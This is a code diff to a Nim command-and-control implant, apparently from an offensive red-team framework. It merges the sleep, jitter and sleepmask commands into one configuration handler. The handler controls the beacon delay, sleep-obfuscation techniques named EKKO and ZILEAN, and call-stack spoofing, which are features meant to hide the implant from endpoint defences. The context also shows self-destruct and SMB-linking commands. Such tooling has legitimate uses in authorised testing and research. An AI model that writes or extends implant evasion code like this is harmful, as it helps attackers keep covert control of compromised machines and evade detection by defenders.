@@ -18,11 +18,56 @@ for cmd in low(CommandType) .. high(CommandType):
 
 #[
     Built-in modules (always enabled)
-    - exit
-    - sleep configuration
+    - Agent configuration
+    - Exit
     - SMB linking 
     - Job management
 ]#
+commands[CMD_CONFIG] = proc(ctx: AgentCtx, task: Task): TaskResult =
+    try:
+        print "   [>] Updating agent configuration."
+
+        const UNSET = high(uint32) # -1
+        let 
+            sleepDelay = Bytes.toUint32(task.args[0].data)
+            jitter = Bytes.toUint32(task.args[1].data)
+            technique = Bytes.toString(task.args[2].data)
+            spoof = cast[bool](task.args[3].data[0])
+            noSpoof = cast[bool](task.args[4].data[0])
+
+        if sleepDelay != UNSET: 
+            ctx.sleepSettings.sleepDelay = sleepDelay
+        if jitter != UNSET: 
+            ctx.sleepSettings.jitter = jitter
+        if technique.len > 0:
+            ctx.sleepSettings.sleepTechnique = parseEnum[SleepObfuscationTechnique](technique.toUpperAscii())
+        if spoof: 
+            ctx.sleepSettings.spoofStack = true
+        if noSpoof: 
+            ctx.sleepSettings.spoofStack = false
+
+        let spoofStack = 
+            if ctx.sleepSettings.spoofStack and ctx.sleepSettings.sleepTechnique notin {EKKO, ZILEAN}:
+                "true (unused)" # Stack spoofing is only available for EKKO and ZILEAN
+            else:
+                $ctx.sleepSettings.spoofStack
+
+        let config = fmt"""Sleep settings:
+ - Delay:          {$ctx.sleepSettings.sleepDelay}s
+ - Jitter:         {$ctx.sleepSettings.jitter}%
+ - Sleepmask:      {$ctx.sleepSettings.sleepTechnique}
+ - Stack spoofing: {spoofStack}"""
+
+        # Return binary structure containing sleepDelay and overall agent config
+        # The sleep delay is updated in the team server database and on the client 
+        var packer = Packer.init()
+        packer.add(ctx.sleepSettings.sleepDelay)
+        packer.addDataWithLengthPrefix(string.toBytes(config))
+        
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())
+
+    except CatchableError as err:
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 commands[CMD_EXIT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
@@ -42,58 +87,6 @@ commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
     except CatchableError as err:
         return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
-commands[CMD_SLEEP] = proc(ctx: AgentCtx, task: Task): TaskResult = 
-    try: 
-        let delay = Bytes.toUint32(task.args[0].data) 
-
-        print fmt"   [>] Setting sleep delay to {delay} seconds."
-        ctx.sleepSettings.sleepDelay = delay
-
-        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}s, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
-
-    except CatchableError as err: 
-        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-
-commands[CMD_JITTER] = proc(ctx: AgentCtx, task: Task): TaskResult = 
-    try:
-        let jitter = Bytes.toUint32(task.args[0].data)
-        
-        if jitter < 0 or jitter > 100: 
-            raise newException(CatchableError, protect("Invalid jitter value."))                    
-
-        print fmt"   [>] Setting jitter to {jitter}%."
-        ctx.sleepSettings.jitter = jitter 
-
-        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}s, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
-    
-    except CatchableError as err: 
-        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-
-commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
-    try: 
-        print fmt"   [>] Updating sleepmask settings."
-        
-        let spoofStack = cast[bool](task.args[1].data[0])
-        
-        if spoofStack:
-            ctx.sleepSettings.spoofStack = spoofStack
-
-        if task.args[0].data.len > 0:
-            ctx.sleepSettings.sleepTechnique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
-            ctx.sleepSettings.spoofStack = spoofStack
-
-        let response = fmt"""Sleep settings: 
- - Technique:      {$ctx.sleepSettings.sleepTechnique}
- - Delay:          {$ctx.sleepSettings.sleepDelay}s
- - Jitter:         {$ctx.sleepSettings.jitter}%
- - Stack spoofing: {$ctx.sleepSettings.spoofStack}"""
-        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
-
-    except CatchableError as err: 
-        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-
 commands[CMD_LINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
         print "   [>] Linking agent."
